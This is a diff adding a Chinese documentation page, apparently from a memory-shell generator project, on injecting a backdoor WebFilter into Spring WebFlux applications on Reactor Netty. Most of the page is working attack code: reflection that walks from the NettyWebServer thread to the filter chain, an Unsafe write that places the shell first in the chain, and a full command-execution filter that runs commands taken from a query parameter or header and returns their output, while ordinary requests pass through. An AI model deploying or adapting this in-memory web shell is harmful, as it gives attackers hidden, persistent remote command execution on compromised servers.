@@ -1,5 +1,110 @@
 ---
 title: WebFlux WebFilter
+description: 过滤器，总是需要一种方式对所有进入的请求进行处理
 ---
 
-hello
+> [官方文档 - Spring WebFlux - Filters](https://docs.spring.io/spring-framework/reference/web/webflux/dispatcher-handler.html#webflux-filters)
+
+WebFilter 是 WebFlux 的全局请求过滤器，接口只有一个方法：
+
+```java
+public interface WebFilter {
+    Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain);
+}
+```
+
+与 Servlet Filter 一样是链式模型：调用 `chain.filter(exchange)` 才会继续执行下一个过滤器，最终进入 `DispatcherHandler`；不调用则请求在当前过滤器结束，响应由它自己写出。
+
+## 过滤器链
+
+Spring Boot 启动时 `WebHttpHandlerBuilder` 收集容器里的 WebFilter，构造 `FilteringWebHandler`：
+
+```java
+WebHandler decorated = new FilteringWebHandler(this.webHandler, this.filters);
+decorated = new ExceptionHandlingWebHandler(decorated, this.exceptionHandlers);
+HttpWebHandlerAdapter adapted = new HttpWebHandlerAdapter(decorated);
+```
+
+`FilteringWebHandler` 内部用 `DefaultWebFilterChain` 串起过滤器列表，链尾是 `DispatcherHandler`。所以拿到 `FilteringWebHandler` 的 `chain` 字段，就等于拿到了整条过滤器链。
+
+Reactor Netty 下的完整链路如下，注入器沿 `delegate` 找到 `FilteringWebHandler`：
+
+```text
+ReactorHttpHandlerAdapter
+  → WebServerManager.DelayedInitializationHttpHandler
+  → HttpWebHandlerAdapter
+  → ExceptionHandlingWebHandler
+  → FilteringWebHandler
+  → DefaultWebFilterChain
+  → DispatcherHandler
+```
+
+## 注入
+
+WebFlux 应用通常由 Spring Boot 内嵌的 Reactor Netty 启动。注入器遍历所有线程，找到类名包含 `NettyWebServer` 的服务线程，从它一步步反射到 `FilteringWebHandler`：
+
+```java
+Object nettyWebServer = getFieldValue(thread, "this$0");
+Object reactorHttpHandlerAdapter = getFieldValue(nettyWebServer, "handler");
+Object httpHandler = getFieldValue(reactorHttpHandlerAdapter, "httpHandler");
+return (FilteringWebHandler) getFieldValue(
+        getFieldValue(getFieldValue(httpHandler, "delegate"), "delegate"), "delegate");
+```
+
+`FilteringWebHandler.chain` 是 final 字段。注入器复制现有过滤器列表，把 shell 插到第 0 位，重建一条 `DefaultWebFilterChain`，再用 `sun.misc.Unsafe` 写回 final 字段：
+
+```java
+DefaultWebFilterChain chain = (DefaultWebFilterChain) getFieldValue(webHandler, "chain");
+List<WebFilter> filters = new ArrayList<>(chain.getFilters());
+for (WebFilter filter : filters) {
+    if (filter.getClass().getName().equals(getClassName())) {
+        return;
+    }
+}
+filters.add(0, (WebFilter) shell);
+
+DefaultWebFilterChain newChain = new DefaultWebFilterChain(chain.getHandler(), filters);
+setFinalField(webHandler, "chain", newChain);
+```
+
+`chain.getHandler()` 是链尾的 `DispatcherHandler`，不能丢；否则 WebFilter 链结束后没有处理器。插入第 0 位意味着 shell 先于所有业务 WebFilter 执行。
+
+## WebFilterShell
+
+```java
+public class CommandWebFilter implements WebFilter {
+    public static String paramName;
+
+    @Override
+    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
+        String p = exchange.getRequest().getQueryParams().getFirst(paramName);
+        if (p == null || p.isEmpty()) {
+            p = exchange.getRequest().getHeaders().getFirst(paramName);
+        }
+        if (p == null) {
+            return chain.filter(exchange);
+        }
+        return Mono.fromCallable(() -> {
+            InputStream inputStream = getInputStream(getParam(p));
+            return new Scanner(inputStream).useDelimiter("\\A").next();
+        }).subscribeOn(Schedulers.boundedElastic())
+          .flatMap(result -> exchange.getResponse().writeWith(
+                  Mono.just(new DefaultDataBufferFactory().wrap(result.getBytes(StandardCharsets.UTF_8)))));
+    }
+}
+```
+
+1. 先取 query 参数，再取同名请求头；都没有时调用 `chain.filter(exchange)` 放行，业务不受影响。
+2. 命令执行、读取输出流都是阻塞操作，必须放到 `Schedulers.boundedElastic()`，不能占用 Netty event loop。
+3. 命中后直接 `writeWith` 写响应，不再调用 `chain.filter`，请求在过滤器链首结束。
+4. `paramName` 由生成器写入，shell 实例在过滤器链中是单例，不要在其中保存请求级状态。
+
+## 限制
+
+**没有 URL Pattern。** WebFilter 对进入 WebFlux 的所有请求生效，包括最终 404 的路径；是否命中完全由 shell 自己判断参数或请求头。
+
+**只适用于内嵌 Reactor Netty。** 注入器依赖 Spring Boot 的 `NettyWebServer` 线程；WebFlux 部署在 Servlet 容器（Tomcat、Jetty、Undertow）时没有这个线程，应改用对应容器的内存马。纯 Reactor Netty 手工启动的应用没有 `NettyWebServer` 类，同样不适用。
+
+**final 字段替换。** `chain` 通过 `Unsafe.putObject` 修改，修改后对所有后续请求立即生效；已进入 `DefaultWebFilterChain` 的请求仍使用旧链。重复注入按类名去重。
+
+**排在最前不等于绕过一切。** shell 在业务 WebFilter 之前，但仍在 Netty HTTP 解码之后；SUO5 这类长连接工具在 WebFlux 下只提供 WebFilter 模板。
